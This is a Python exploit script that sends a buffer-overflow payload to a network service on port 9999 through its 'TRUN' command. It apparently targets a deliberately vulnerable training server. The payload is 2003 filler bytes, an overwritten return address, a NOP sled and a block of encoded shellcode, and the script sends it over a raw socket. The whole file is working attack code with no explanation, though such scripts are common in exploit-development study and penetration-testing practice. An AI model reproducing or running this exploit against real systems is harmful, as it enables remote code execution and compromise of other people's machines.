#!/usr/bin/python

import sys, socket

overflow = (
"\xbe\x4d\xa8\xed\xe5\xd9\xce\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x75\x12\x83\xc5\x04\x03\x38\xa6\x0f\x10\x3e\x5e\x4d"
"\xdb\xbe\x9f\x32\x55\x5b\xae\x72\x01\x28\x81\x42\x41\x7c\x2e"
"\x28\x07\x94\xa5\x5c\x80\x9b\x0e\xea\xf6\x92\x8f\x47\xca\xb5"
"\x13\x9a\x1f\x15\x2d\x55\x52\x54\x6a\x88\x9f\x04\x23\xc6\x32"
"\xb8\x40\x92\x8e\x33\x1a\x32\x97\xa0\xeb\x35\xb6\x77\x67\x6c"
"\x18\x76\xa4\x04\x11\x60\xa9\x21\xeb\x1b\x19\xdd\xea\xcd\x53"
"\x1e\x40\x30\x5c\xed\x98\x75\x5b\x0e\xef\x8f\x9f\xb3\xe8\x54"
"\xdd\x6f\x7c\x4e\x45\xfb\x26\xaa\x77\x28\xb0\x39\x7b\x85\xb6"
"\x65\x98\x18\x1a\x1e\xa4\x91\x9d\xf0\x2c\xe1\xb9\xd4\x75\xb1"
"\xa0\x4d\xd0\x14\xdc\x8d\xbb\xc9\x78\xc6\x56\x1d\xf1\x85\x3e"
"\xd2\x38\x35\xbf\x7c\x4a\x46\x8d\x23\xe0\xc0\xbd\xac\x2e\x17"
"\xc1\x86\x97\x87\x3c\x29\xe8\x8e\xfa\x7d\xb8\xb8\x2b\xfe\x53"
"\x38\xd3\x2b\xf3\x68\x7b\x84\xb4\xd8\x3b\x74\x5d\x32\xb4\xab"
"\x7d\x3d\x1e\xc4\x14\xc4\xc9\x2b\x40\x23\x89\xc4\x93\xab\x9b"
"\x48\x1d\x4d\xf1\x60\x4b\xc6\x6e\x18\xd6\x9c\x0f\xe5\xcc\xd9"
"\x10\x6d\xe3\x1e\xde\x86\x8e\x0c\xb7\x66\xc5\x6e\x1e\x78\xf3"
"\x06\xfc\xeb\x98\xd6\x8b\x17\x37\x81\xdc\xe6\x4e\x47\xf1\x51"
"\xf9\x75\x08\x07\xc2\x3d\xd7\xf4\xcd\xbc\x9a\x41\xea\xae\x62"
"\x49\xb6\x9a\x3a\x1c\x60\x74\xfd\xf6\xc2\x2e\x57\xa4\x8c\xa6"
"\x2e\x86\x0e\xb0\x2e\xc3\xf8\x5c\x9e\xba\xbc\x63\x2f\x2b\x49"
"\x1c\x4d\xcb\xb6\xf7\xd5\xeb\x54\xdd\x23\x84\xc0\xb4\x89\xc9"
"\xf2\x63\xcd\xf7\x70\x81\xae\x03\x68\xe0\xab\x48\x2e\x19\xc6"
"\xc1\xdb\x1d\x75\xe1\xc9")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.81.1',9999))
        s.send(("TRUN /.:/" + shellcode))
        s.close()

except:
        print ("error connecting to server")
        sys.exit()